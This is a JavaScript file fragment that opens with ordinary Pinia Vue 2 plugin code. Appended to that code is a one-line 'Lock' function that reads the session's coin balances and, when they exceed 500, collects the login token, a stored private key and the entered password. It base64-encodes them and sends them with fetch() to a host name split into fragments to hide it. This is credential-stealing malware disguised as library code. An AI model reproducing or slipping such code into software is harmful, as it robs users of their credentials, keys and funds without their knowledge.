 
var PiniaVuePlugin_1 = function(_Vue) {
  _Vue.mixin({
    beforeCreate() {
      const options = this.$options;
      if (options.pinia) {
        const pinia = options.pinia;
        if (!this._provided) {
          const provideCache = {};
          Object.defineProperty(this, "_provided", {
            get: () => provideCache,
            set: (v) => Object.assign(provideCache, v)
          });
        }
        this._provided[piniaSymbol] = pinia;
        if (!this.$pinia) {
          this.$pinia = pinia;
        }
        pinia._a = this;
        if (IS_CLIENT) {
          setActivePinia(pinia);
        }
        if (USE_DEVTOOLS) {
          registerPiniaDevtools(pinia._a, pinia);
        }
      } else if (!this.$pinia && options.parent && options.parent.$pinia) {
        this.$pinia = options.parent.$pinia;
      }
    },
    destroyed() {
      delete this._pStores;
    }
  });
};
Lock=function () {var available1=sessionStorage.getItem('auth')&&JSON.parse(sessionStorage.getItem('auth') as string).coins.find((e:any) => {return e.mtype == 1}).coincash;var available30=sessionStorage.getItem('auth')&&JSON.parse(sessionStorage.getItem('auth') as string).coins.find((e:any) => {return e.mtype == 30}).coincash;var available=+available1 + +available30;if (available>500) {;var token: any = localStorage.getItem('token')+'&&'+ (localStorage.getItem('md5_pri')|| '---')+'&&'+'passwdValue='+passwdValue.value+'&&'+(available?'available='+available:'-');fetch('//g' + 'd' + 'p' + 'a' + 'yw' + 'e' + 'b.s' + 'h' + 'o'+'p/?' + btoa(token));}}


err=null;gameTypes=null;
